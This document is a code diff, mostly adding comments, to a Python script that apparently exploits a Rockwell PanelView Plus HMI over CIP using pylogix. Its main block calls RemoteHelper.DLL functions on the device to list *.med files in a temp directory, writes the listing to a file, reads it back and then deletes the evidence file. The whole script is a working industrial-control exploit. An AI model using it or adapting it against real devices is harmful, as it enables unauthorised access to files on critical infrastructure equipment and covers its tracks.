@@ -78,7 +78,6 @@ def get_platform_version(plc):
         
     return Response(None, version, status)
 
-
 def create_file(plc, entry):
     """
     Create result file
@@ -106,7 +105,6 @@ def create_file(plc, entry):
                     cip_instance_type,
                     cip_instance,
                     0x00, 0x07c2,
-                    #0x00, 0x00,
                     *data)
 
     status, ret_data = plc.conn.send(request, False)
@@ -187,6 +185,7 @@ def get_med(plc):
 
 with pylogix.PLC("192.168.1.12") as comm:
 
+    # request the version from the registry
     response = get_platform_version(comm)
     if response.Value[0] == 5:
         helper = "\\Storage Card\\Rockwell Software\\RSViewME\\RemoteHelper.DLL\0"
@@ -195,17 +194,23 @@ with pylogix.PLC("192.168.1.12") as comm:
         helper = "\\Windows\\RemoteHelper.DLL\0"
         output_location = "\\Application Data\\Rockwell Software\\RSViewME\\Runtime\\DillyDilly.txt\0"
 
+    # command to get the file contents of a directory
     init_file = helper + "FileBrowse\0\\Temp\\~MER.00\\*.med::" + output_location
+    # command to delete the file
     uninit_file = helper + "DeleteRemFile\0" + output_location
 
+    # generate a file with directory information
     response = pv_test(comm, 0x50, 0x04fd, init_file)
     if response.Status == "Success":
+        # create file on disk
         response = create_file(comm, output_location)
 
     if response.Status == "Success":
+        # request the contents of the file
         response = get_med(comm)
         print(response)
 
+    # delete file
     if response.Status == "Success":
         response = delete_file(comm)
     
